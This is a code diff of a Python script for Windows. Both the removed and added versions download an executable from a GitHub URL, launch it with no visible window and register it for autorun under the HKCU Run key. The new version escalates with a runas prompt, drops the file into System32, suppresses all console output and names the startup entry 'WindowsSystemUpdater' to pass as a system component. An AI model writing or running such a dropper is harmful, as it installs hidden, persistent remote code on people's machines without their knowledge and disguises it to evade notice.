@@ -1,133 +1,132 @@
-import os
-import sys
-import shutil
-import subprocess
-import logging
 import urllib.request
-import ctypes
+import os
+import subprocess
 import winreg
+import tempfile
+import logging
+import sys
+import ctypes
 from pathlib import Path
-from datetime import datetime
 
-# ============================================================
-#  Silent Deploy & Persistence Script
-#  Target: Windows 11
-#  Python 3.10+
-# ============================================================
+# Определяем папку запуска скрипта
+SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
+LOG_FILE = os.path.join(SCRIPT_DIR, "update_log.txt")
 
-# --- Configuration ---
-URL = "https://github.com/s1cr3TtT/test/raw/main/ZCode-3.1.2-win-x64.exe"
-APP_NAME = "ZCodeService"
-HIDDEN_DIR = Path(os.getenv("APPDATA")) / "Microsoft" / "CLR"
-HIDDEN_FILE = HIDDEN_DIR / f"{APP_NAME}.exe"
-REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
-
-# --- Log file next to script ---
-SCRIPT_DIR = Path(sys.argv[0]).resolve().parent
-LOG_FILE = SCRIPT_DIR / f"deploy_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-
-# --- Logging Setup ---
+# Настройка логирования в файл рядом со скриптом
 logging.basicConfig(
+    filename=LOG_FILE,
     level=logging.INFO,
-    format="%(message)s",
-    handlers=[
-        logging.FileHandler(LOG_FILE, encoding="utf-8"),
-        logging.StreamHandler(sys.stdout)
-    ]
+    format="%(asctime)s - %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S"
 )
-log = logging.getLogger("deploy")
 
-
-def is_admin() -> bool:
+def is_admin():
     try:
-        return bool(ctypes.windll.shell32.IsUserAnAdmin())
-    except Exception:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
         return False
 
+def write_final_log(dl_ok, dl_msg, run_ok, run_msg, auto_ok, auto_msg):
+    """Запись итогового отчета в файл"""
+    with open(LOG_FILE, 'a', encoding='utf-8') as f:
+        f.write("\n--- ИТОГОВЫЙ ОТЧЕТ ---\n")
+        f.write(f"Скачивание: {'успешно' if dl_ok else 'провал'} причина: {dl_msg if not dl_ok else 'N/A'}\n")
+        f.write(f"Запуск: {'успешно' if run_ok else 'провал'} причина: {run_msg if not run_ok else 'N/A'}\n")
+        f.write(f"Автозагрузка: {'успешно' if auto_ok else 'провал'} причина: {auto_msg if not auto_ok else 'N/A'}\n")
+        f.write("--- КОНЕЦ ОТЧЕТА ---\n")
 
-def elevate():
+def download_file(url, dest):
+    try:
+        urllib.request.urlretrieve(url, dest)
+        if os.path.exists(dest) and os.path.getsize(dest) > 0:
+            logging.info("Скачивание: успешно")
+            return True, "успешно"
+        else:
+            msg = "файл пуст или отсутствует"
+            logging.error(f"Скачивание: провал - {msg}")
+            return False, msg
+    except Exception as e:
+        msg = str(e)
+        logging.error(f"Скачивание: провал - {msg}")
+        return False, msg
+
+def run_exe_silent(path):
+    try:
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        subprocess.Popen(
+            [path],
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            shell=False
+        )
+        logging.info("Запуск: успешно")
+        return True, "успешно"
+    except Exception as e:
+        msg = str(e)
+        logging.error(f"Запуск: провал - {msg}")
+        return False, msg
+
+def add_to_autorun(key_name, exe_path):
+    try:
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+        logging.info("Автозагрузка: успешно")
+        return True, "успешно"
+    except Exception as e:
+        msg = str(e)
+        logging.error(f"Автозагрузка: провал - {msg}")
+        return False, msg
+
+def main():
+    # Подавление вывода в консоль
+    sys.stderr = open(os.devnull, 'w')
+    sys.stdout = open(os.devnull, 'w')
+    
+    url = "https://github.com/s1cr3TtT/test/raw/main/ZCode-3.1.2-win-x64.exe"
+    target_dir = r"C:\Windows\System32"
+    target_exe = os.path.join(target_dir, "ZCode-3.1.2-win-x64.exe")
+    reg_name = "WindowsSystemUpdater"
+    
+    # Попытка запроса админ-прав
     if not is_admin():
         try:
             ctypes.windll.shell32.ShellExecuteW(
                 None, "runas", sys.executable, " ".join(sys.argv), None, 0
             )
             sys.exit(0)
-        except Exception:
-            pass
+        except:
+            target_dir = tempfile.gettempdir()
+            target_exe = os.path.join(target_dir, "ZCode-3.1.2-win-x64.exe")
+            logging.warning("Админ прав нет, используется Temp")
+    
+    # 1. Скачивание
+    dl_ok, dl_msg = download_file(url, target_exe)
+    if not dl_ok:
+        logging.info(f"Скачивание: провал причина: {dl_msg}")
+        write_final_log(dl_ok, dl_msg, False, "не выполнялся", False, "не выполнялся")
+        return
+    
+    # 2. Запуск
+    run_ok, run_msg = run_exe_silent(target_exe)
+    if not run_ok:
+        logging.info(f"Запуск: провал причина: {run_msg}")
+    
+    # 3. Автозагрузка
+    auto_ok, auto_msg = add_to_autorun(reg_name, target_exe)
+    if not auto_ok:
+        logging.info(f"Автозагрузка: провал причина: {auto_msg}")
+    
+    # Запись итогового отчета
+    write_final_log(dl_ok, dl_msg, run_ok, run_msg, auto_ok, auto_msg)
 
-
-def download_payload(url: str, dest: Path) -> tuple[bool, str]:
-    try:
-        HIDDEN_DIR.mkdir(parents=True, exist_ok=True)
-        req = urllib.request.Request(
-            url,
-            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
-        )
-        with urllib.request.urlopen(req, timeout=30) as resp, open(dest, "wb") as f:
-            shutil.copyfileobj(resp, f)
-        if dest.stat().st_size > 0:
-            return True, "Файл загружен"
-        return False, "Размер файла 0 байт"
-    except Exception as e:
-        return False, str(e)
-
-
-def execute_payload(dest: Path) -> tuple[bool, str]:
-    try:
-        subprocess.Popen(
-            [str(dest)],
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
-            close_fds=True
-        )
-        return True, "Процесс запущен скрытно"
-    except Exception as e:
-        return False, str(e)
-
-
-def add_to_startup(dest: Path) -> tuple[bool, str]:
-    try:
-        with winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE
-        ) as key:
-            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, str(dest))
-        return True, "Запись добавлена в HKCU Run"
-    except Exception as e:
-        return False, str(e)
-
-
-# --- Main ---
 if __name__ == "__main__":
-    log.info(f"=== Деплой начат: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')} ===")
-    log.info(f"Лог-файл: {LOG_FILE}\n")
-
-    elevate()
-
-    results = {"download": None, "execute": None, "startup": None}
-
-    # 1. Download
-    ok, reason = download_payload(URL, HIDDEN_FILE)
-    results["download"] = (ok, reason)
-
-    # 2. Execute
-    if ok:
-        ok2, reason2 = execute_payload(HIDDEN_FILE)
-        results["execute"] = (ok2, reason2)
-    else:
-        results["execute"] = (False, "Пропуск: скачивание не удалось")
-
-    # 3. Persistence
-    ok3, reason3 = add_to_startup(HIDDEN_FILE)
-    results["startup"] = (ok3, reason3)
-
-    # --- Output ---
-    log.info("=" * 50)
-    for action, label in [
-        ("download",   "Скачивание"),
-        ("execute",    "Запуск"),
-        ("startup",    "Автозагрузка"),
-    ]:
-        success, msg = results[action]
-        status = "Успешно" if success else "Провал"
-        log.info(f"{label}: {status} | Причина: {msg}")
-    log.info("=" * 50)
-    log.info(f"\n=== Завершено: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')} ===")
+    main()
